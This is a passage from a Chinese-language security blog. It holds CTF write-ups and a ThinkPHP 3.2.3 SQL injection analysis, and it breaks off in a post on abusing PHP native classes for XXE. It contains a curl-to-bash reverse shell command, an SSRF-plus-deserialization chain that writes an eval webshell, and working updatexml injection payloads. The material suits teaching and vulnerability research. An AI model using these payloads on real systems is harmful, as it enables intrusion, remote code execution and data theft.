class="string">&quot;hidden&quot;</span> value=<span class="string">&quot;GWHT.php&quot;</span> name=<span class="string">&quot;file&quot;</span>&gt;</span><br><span class="line">        &lt;textarea style=<span class="string">&quot;border-radius: 1rem;&quot;</span> type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;count&quot;</span> rows=<span class="number">10</span> cols=<span class="number">50</span>&gt;&lt;/textarea&gt;&lt;br /&gt;</span><br><span class="line">        &lt;input type=<span class="string">&quot;submit&quot;</span>&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line"></span><br><span class="line">    <span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;count&quot;</span>])) &#123;</span><br><span class="line">        <span class="variable">$count</span> = <span class="variable">$_GET</span>[<span class="string">&quot;count&quot;</span>];</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/;|base64|rot13|base32|base16|&lt;\?php|#/i&#x27;</span>, <span class="variable">$count</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;hacker!&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;h2&gt;The Count is: &quot;</span> . exec(<span class="string">&#x27;printf \&#x27;&#x27;</span> . <span class="variable">$count</span> . <span class="string">&#x27;\&#x27; | wc -c&#x27;</span>) . <span class="string">&quot;&lt;/h2&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line"></span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>读取check.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$pass</span> = <span class="string">&quot;GWHT&quot;</span>;</span><br><span class="line"><span class="comment">// Cookie password.</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Here is nothing, isn&#x27;t it ?&quot;</span>;</span><br><span class="line"></span><br><span class="line">header(<span class="string">&#x27;Location: /&#x27;</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>反弹shell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http:&#x2F;&#x2F;x.x.x.x&#x2F;qwzf|bash</span><br></pre></td></tr></table></figure><p>qwzf文件内容</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;x.x.x.x&#x2F;12345 0&gt;&amp;1</span><br></pre></td></tr></table></figure><p><img src="https://www.hualigs.cn/image/608610914c607.jpg"></p><p><img src="https://www.hualigs.cn/image/608610911f6c6.jpg"></p><p>在env中找到flag</p><p><img src="https://www.hualigs.cn/image/6086109139433.jpg"></p><h1 id="EasySer"><a href="#EasySer" class="headerlink" title="EasySer"></a>EasySer</h1><p>源码中有提示访问ser.php</p><p><img src="https://www.hualigs.cn/image/608610916ae9d.jpg"></p><p>ssrf读取ser.php</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;1d376013-e9d5-4028-bc85-8fd14af0feea.node3.buuoj.cn&#x2F;star1.php&#x2F;star1.php?path&#x3D;http%3A%2F%2F127.0.0.1%2Fser.php</span><br></pre></td></tr></table></figure><p><img src="https://www.hualigs.cn/image/608610916ba11.jpg"></p><p>file_put_contents方法可以被利用</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> ( <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>] == <span class="string">&quot;127.0.0.1&quot;</span> ) &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br><span class="line"><span class="variable">$flag</span>=<span class="string">&#x27;&#123;Trump_:&quot;fake_news!&quot;&#125;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GWHT</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$hero</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;hero = <span class="keyword">new</span> Yasuo;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;hero))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;hero-&gt;hasaki();</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;You don&#x27;t look very happy&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Yongen</span></span>&#123; <span class="comment">//flag.php</span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$text</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span>=<span class="string">&#x27;&#x27;</span>,<span class="variable">$text</span>=<span class="string">&#x27;&#x27;</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span> -&gt; file = <span class="variable">$file</span>;</span><br><span class="line">        <span class="keyword">$this</span> -&gt; text = <span class="variable">$text</span>;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">hasaki</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$d</span>   = <span class="string">&#x27;&lt;?php die(&quot;nononon&quot;);?&gt;&#x27;</span>;</span><br><span class="line">        <span class="variable">$a</span>= <span class="variable">$d</span>. <span class="keyword">$this</span>-&gt;text;</span><br><span class="line">         @file_put_contents(<span class="keyword">$this</span>-&gt; file,<span class="variable">$a</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Yasuo</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">hasaki</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;I&#x27;m the best happy windy man&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>构造exp，这里用<code>php://filter</code>绕过拼接的<code>&lt;?php die(&quot;nononon&quot;);?&gt;</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GWHT</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$hero</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;hero=<span class="keyword">new</span> Yongen();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Yongen</span></span>&#123; <span class="comment">//flag.php</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span> = <span class="string">&quot;php://filter/write=convert.base64-decode/resource=shell.php&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$text</span> = <span class="string">&quot;aaaPD9waHAgZXZhbCgkX1BPU1RbMV0pOz8+&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> GWHT;</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure><p>构造ssrf请求触发反序列化</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;1d376013-e9d5-4028-bc85-8fd14af0feea.node3.buuoj.cn&#x2F;star1.php&#x2F;star1.php?path&#x3D;http:&#x2F;&#x2F;127.0.0.1&#x2F;ser.php&amp;c&#x3D;O%3A4%3A%22GWHT%22%3A1%3A%7Bs%3A4%3A%22hero%22%3BO%3A6%3A%22Yongen%22%3A2%3A%7Bs%3A4%3A%22file%22%3Bs%3A59%3A%22php%3A%2F%2Ffilter%2Fwrite%3Dconvert.base64-decode%2Fresource%3Dshell.php%22%3Bs%3A4%3A%22text%22%3Bs%3A35%3A%22aaaPD9waHAgZXZhbCgkX1BPU1RbMV0pOz8%2B%22%3B%7D%7D</span><br></pre></td></tr></table></figure><p><img src="https://www.hualigs.cn/image/60861094c91bc.jpg"></p><p>成功写入文件，得到flag</p><p><img src="https://www.hualigs.cn/image/60861091c8805.jpg"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>ThinkPhp3.2.3注入漏洞总结</title>
    <link href="/2021/04/20/ThinkPhp3-2-3%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/"/>
    <url>/2021/04/20/ThinkPhp3-2-3%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<h1 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h1><p>数据库连接配置</p><p><img src="https://www.hualigs.cn/image/607e923dad073.jpg"></p><h1 id="thinkphp3-2-3-where注入"><a href="#thinkphp3-2-3-where注入" class="headerlink" title="thinkphp3.2.3 where注入"></a>thinkphp3.2.3 where注入</h1><p>控制器</p><p>/Application/Home/Controller/IndexController.class.php</p><p><img src="https://www.hualigs.cn/image/607e923dae04f.jpg"></p><p><img src="https://www.hualigs.cn/image/607e923db9e10.jpg"></p><p>payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;tp3&#x2F;?id[where]&#x3D;1%20and%201&#x3D;updatexml(1,concat(0x7e,(select database()),0x7e),1)#</span><br></pre></td></tr></table></figure><p><img src="https://www.hualigs.cn/image/607e92437644e.jpg"></p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>在<code>I()</code>方法上打一个断点，<code>I()</code>方法用来获取GET和POST参数</p><p><img src="https://www.hualigs.cn/image/607e924305371.jpg"></p><p>在<code>I()</code>方法中经过<code>htmlspecialchars()</code>处理，再经过functions.php中<code>think_filter</code>函数过滤，这两处过滤对payload没有影响，可以直接忽略</p><p><img src="https://www.hualigs.cn/image/607e923de6764.jpg"></p><p><img src="https://www.hualigs.cn/image/607e923dcbc98.jpg"></p><p>think_filter函数</p><p><img src="https://www.hualigs.cn/image/607e923df0bb8.jpg"></p><p>/ThinkPHP/Library/Think/Model.class.php</p><p>接下来进入<code>find()</code>方法处理 </p><p>参数经过Model.class.php中的<code>_parseOptions()</code>方法处理后带入select方法进行查询，可以看到注入语句在经过<code>_parseOptions()</code>后就变成了int类型，后面的语句被去除了。</p><p><img src="https://www.hualigs.cn/image/607e923e02118.jpg"></p><p><code>_parseOptions</code>执行前，注入语句没有发生变化</p><p><img src="https://www.hualigs.cn/image/607e924155ec7.jpg"></p><p>跟进·<code>_parseOptions()</code>，满足条件进入<code>_parseType()</code></p><p><img src="https://www.hualigs.cn/image/607e92431e9fe.jpg"></p><p>在经过<code>_parseType</code>处理后，注入语句被转换成了int型，只保留了前面的数字,注意这里的<code>$options[&#39;where&#39;]</code>是一个array</p><p><img src="https://www.hualigs.cn/image/607e92428e1eb.jpg"></p><p>跟进<code>_parseType()</code>，发现这里进行了强制类型转换，把payload强制转换成了int型，去掉了后面部分</p><p><img src="https://www.hualigs.cn/image/607e923e1ab2f.jpg"></p><h2 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h2><p>只要<code>is_array($options[&#39;where&#39;])</code>这个条件不满足，就不会进入到强制转换函数中，payload也就不会被过滤，所以要想办法让<code>$options[&#39;where&#39;]</code>不为数组</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$options</span>[<span class="string">&#x27;where&#x27;</span>]) &amp;&amp; is_array(<span class="variable">$options</span>[<span class="string">&#x27;where&#x27;</span>]) &amp;&amp; !<span class="keyword">empty</span>(<span class="variable">$fields</span>) &amp;&amp; !<span class="keyword">isset</span>(<span class="variable">$options</span>[<span class="string">&#x27;join&#x27;</span>]))</span><br></pre></td></tr></table></figure><p>当我们传入的payload为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;45789 and 1&#x3D;updatexml(1,concat(0x7e,(select database()),0x7e),1)#</span><br></pre></td></tr></table></figure><p><code>_parseOptions</code>执行前，<code>$options[&#39;where&#39;]</code>就是一个数组了</p><p><img src="https://www.hualigs.cn/image/607e92428e1eb.jpg"></p><p><code>find()</code>函数开始存在一个判断，如果传入的参数为数字或者字符串，就会把他转换成数组再赋值给<code>$options[&#39;where&#39;]</code>，这样就会满足条件<code>is_array($options[&#39;where&#39;])</code>从而导致payload被转换。</p><p>这里传入<code>find()</code>的参数是<code>45789 and 1=updatexml(1,concat(0x7e,(select database()),0x7e),1)#</code>，满足了if判断中的条件，注入失败。</p><p><img src="https://www.hualigs.cn/image/607e9241b5394.jpg"></p><p>当payload为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id[where]&#x3D;45789 and 1&#x3D;updatexml(1,concat(0x7e,(select database()),0x7e),1)#</span><br></pre></td></tr></table></figure><p>if条件不满足</p><p><code>options[&#39;where&#39;]</code>就会是一个字符串，<code>is_array($options[&#39;where&#39;])</code>条件不满足，就成功绕过了</p><p><img src="https://www.hualigs.cn/image/607e9241b5394.jpg"></p><p>注入语句没有被转换，直接被带入执行。</p><p><img src="https://www.hualigs.cn/image/607e92400b9b7.jpg"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>注入产生的原因是构造的poc绕过了thinkphp对<code>$option[&#39;where&#39;]</code>是否是一个数组的判断，从而不满足<code>is_array($options[&#39;where&#39;])</code>，绕过了<code>_parseType</code>函数过滤，从而导致了注入。</p><h1 id="Thinkphp-3-2-3-exp注入"><a href="#Thinkphp-3-2-3-exp注入" class="headerlink" title="Thinkphp 3.2.3 exp注入"></a>Thinkphp 3.2.3 exp注入</h1><p>控制器</p><p><img src="https://www.hualigs.cn/image/607e923fb01b1.jpg"></p><p>payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;tp3&#x2F;?username[0]&#x3D;exp&amp;username[1]&#x3D;&#x3D;1%20and%20updatexml(1,concat(0x7e,user(),0x7e),1)</span><br></pre></td></tr></table></figure><p><img src="https://www.hualigs.cn/image/607e924383547.jpg"></p><p><code>find()</code>执行到</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$resultSet</span>=<span class="keyword">$this</span>-&gt;db-&gt;select(<span class="variable">$options</span>);</span><br></pre></td></tr></table></figure><p><img src="https://www.hualigs.cn/image/607e924112362.jpg"></p><p>/ThinkPHP/Library/Think/Db/Driver.class.php</p><p>进入<code>select()</code></p><p><img src="https://www.hualigs.cn/image/607e92405be65.jpg"></p><p>进入<code>buildSelectSql()</code></p><p><img src="https://www.hualigs.cn/image/607e923f74c7f.jpg"></p><p>进入<code>parsesql()</code>，关注<code>parseWhere()</code>函数</p><p><img src="https://www.hualigs.cn/image/607e92424058c.jpg"></p><p><code>parseWhere()</code>函数调用<code>parseWhereItem()</code></p><p>elseif语句中直接拼接了where条件到sql语句中，到达该语句需要满足两个条件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(is_array(<span class="variable">$val</span>)) &#123;</span><br><span class="line">            <span class="keyword">if</span>(is_string(<span class="variable">$val</span>[<span class="number">0</span>]))</span><br></pre></td></tr></table></figure><p>由于<code>$exp=strtolower($val[0]);</code>，传入<code>username[0]=exp&amp;username[1]=1 and 1=1</code></p><p><img src="https://www.hualigs.cn/image/607e92426c997.jpg"></p><p>注意控制器那里不能使用<code>I()</code>方法来获取参数，因为前面提到<code>I()</code>方法中调用了<code>think_filter()</code>函数，该函数会过滤exp，导致注入失败</p><p><img src="https://www.hualigs.cn/image/607e923df0bb8.jpg"></p><h1 id="thinkphp-3-2-3-bind注入"><a href="#thinkphp-3-2-3-bind注入" class="headerlink" title="thinkphp 3.2.3 bind注入"></a>thinkphp 3.2.3 bind注入</h1><p>控制器</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$User</span> = M(<span class="string">&quot;Users&quot;</span>);</span><br><span class="line">    <span class="variable">$user</span>[<span class="string">&#x27;id&#x27;</span>] = I(<span class="string">&#x27;id&#x27;</span>);</span><br><span class="line">    <span class="variable">$data</span>[<span class="string">&#x27;password&#x27;</span>] = I(<span class="string">&#x27;password&#x27;</span>);</span><br><span class="line">    <span class="variable">$valu</span> = <span class="variable">$User</span>-&gt;where(<span class="variable">$user</span>)-&gt;save(<span class="variable">$data</span>);</span><br><span class="line">    var_dump(<span class="variable">$valu</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;tp3&#x2F;?id[0]&#x3D;bind&amp;id[1]&#x3D;0 and updatexml(1,concat(0x7e,user(),0x7e),1)&amp;password&#x3D;1</span><br></pre></td></tr></table></figure><p><img src="https://www.hualigs.cn/image/607e924209d7f.jpg"></p><p>这里需要注意<code>id[1]=0</code>原理在下面说</p><p><code>save()</code>函数中添加断点</p><p><img src="https://www.hualigs.cn/image/607e923fe8d55.jpg"></p><p>/ThinkPHP/Library/Think/Db/Driver.class.php</p><p>进入<code>update()</code></p><p>又经过了<code>parseWhere()</code>函数，除了之前利用的<code>exp</code>还有<code>bind</code>可以利用</p><p><img src="https://www.hualigs.cn/image/607e9240d4c79.jpg"></p><p>直接传递payload，发现添加了冒号，注入失败</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;tp3&#x2F;?id[0]&#x3D;bind&amp;id[1]&#x3D;1</span><br></pre></td></tr></table></figure><p><img src="https://www.hualigs.cn/image/607e924147690.jpg"></p><p>可以看到<code>bindParam()</code>添加冒号</p><p><img src="https://www.hualigs.cn/image/607e923f510cf.jpg"></p><p>ThinkPHP/Library/Think/Db/Driver.class.php</p><p><code>execute()</code>将<code>:0</code>替换为传入参数，让参数等于0，相当于<code>:0</code>，然后被替换为1，成功注入</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;bind))&#123;</span><br><span class="line">            <span class="variable">$that</span>   =   <span class="keyword">$this</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;queryStr =   strtr(<span class="keyword">$this</span>-&gt;queryStr,array_map(<span class="function"><span class="keyword">function</span>(<span class="params"><span class="variable">$val</span></span>) <span class="title">use</span>(<span class="params"><span class="variable">$that</span></span>)</span>&#123; <span class="keyword">return</span> <span class="string">&#x27;\&#x27;&#x27;</span>.<span class="variable">$that</span>-&gt;escapeString(<span class="variable">$val</span>).<span class="string">&#x27;\&#x27;&#x27;</span>; &#125;,<span class="keyword">$this</span>-&gt;bind));</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://www.cnblogs.com/-qing-/p/11444871.html">https://www.cnblogs.com/-qing-/p/11444871.html</a></p><p><a href="https://darkless.cn/2020/06/07/thinkphp3.2.3-sqli/">https://darkless.cn/2020/06/07/thinkphp3.2.3-sqli/</a></p><p><a href="https://syst1m.com/post/summary-of-thinkphp3-vulnerability/">https://syst1m.com/post/summary-of-thinkphp3-vulnerability/</a></p><p><a href="https://www.chabug.org/audit/1062.html">https://www.chabug.org/audit/1062.html</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>php原生类利用</title>
    <link href="/2021/04/19/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%88%A9%E7%94%A8/"/>
    <url>/2021/04/19/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%88%A9%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<h1 id="适用场景"><a href="#适用场景" class="headerlink" title="适用场景"></a>适用场景</h1><p>在存在任意类实例化漏洞但是没有pop链的情况下，可以尝试利用原生类</p><h1 id="GlobIterator"><a href="#GlobIterator" class="headerlink" title="GlobIterator"></a>GlobIterator</h1><p>可以列出目录下的文件名</p><p>适用版本：php5.3.* php 7</p><p>第一个参数指定搜索的路径和类型，第二个参数为选择文件的哪个信息作为键名</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$newclass</span> = <span class="keyword">new</span> <span class="built_in">GlobIterator</span>(<span class="string">&#x27;./*.php&#x27;</span>,<span class="number">0</span>);</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$iterator</span> = <span class="keyword">new</span> <span class="built_in">GlobIterator</span>(<span class="keyword">__DIR__</span> . <span class="string">&#x27;./*.php&#x27;</span>);</span><br><span class="line"><span class="keyword">while</span> (<span class="variable">$iterator</span>-&gt;valid()) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$iterator</span>-&gt;current()-&gt;getFilename() . <span class="string">&#x27;&lt;/br&gt;&#x27;</span>;</span><br><span class="line">    <span class="variable">$iterator</span>-&gt;next();</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h1 id="SimpleXMLElement"><a href="#SimpleXMLElement" class="headerlink" title="SimpleXMLElement"></a>SimpleXMLElement</h1><p>SimpleXMLElement::__contruct</p><p>Libxml2.9后默认不允许解析外部实体，可以通过函数参数LIBXML_NOENT开启解析</p><p><img src="php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%88%A9%E7%94%A8.assets/607d89c372164.jpg"><img src="php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%88%A9%E7%94%A8.assets/607d89c378864.jpg">利用</p><p>根据可控方式选择</p><h3 id="本地读取"><a href="#本地读取" class="headerlink" title="本地读取"></a>本地读取</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">NotFound</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;404&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">spl_autoload_register(</span><br><span class="line">    <span class="function"><span class="keyword">function</span> (<span class="params"><span class="variable">$class</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">new</span> NotFound();</span><br><span class="line">    &#125;</span><br><span class="line">);</span><br><span class="line"><span class="variable">$classname</span> = <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>]) ? <span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>] : <span class="literal">null</span>;</span><br><span class="line"><span class="variable">$param</span> = <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;param&#x27;</span>]) ? <span class="variable">$_GET</span>[<span class="string">&#x27;param&#x27;</span>] : <span class="literal">null</span>;</span><br><span class="line"><span class="variable">$param2</span> = <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;param2&#x27;</span>]) ? <span class="variable">$_GET</span>[<span class="string">&#x27;param2&#x27;</span>] : <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(class_exists(<span class="variable">$classname</span>))&#123;</span><br><span class="line">    <span class="variable">$newclass</span> = <span class="keyword">new</span> <span class="variable">$classname</span>(<span class="variable">$param</span>,<span class="variable">$param2</span>);</span><br><span class="line">    var_dump(<span class="variable">$newclass</span>);</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$newclass</span> <span class="keyword">as</span> <span class="variable">$key</span>=&gt;<span class="variable">$value</span>)</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$key</span>.<span class="string">&#x27;=&gt;&#x27;</span>.<span class="variable">$value</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;</span></span><br><span class="line"><span class="string">&lt;!DOCTYPE ANY [ </span></span><br><span class="line"><span class="string">     &lt;!ENTITY xxe SYSTEM &quot;php://filter/read=convert.base64-encode/resource=./1.php&quot;&gt;</span></span><br><span class="line"><span class="string">]&gt;</span></span><br><span class="line"><span 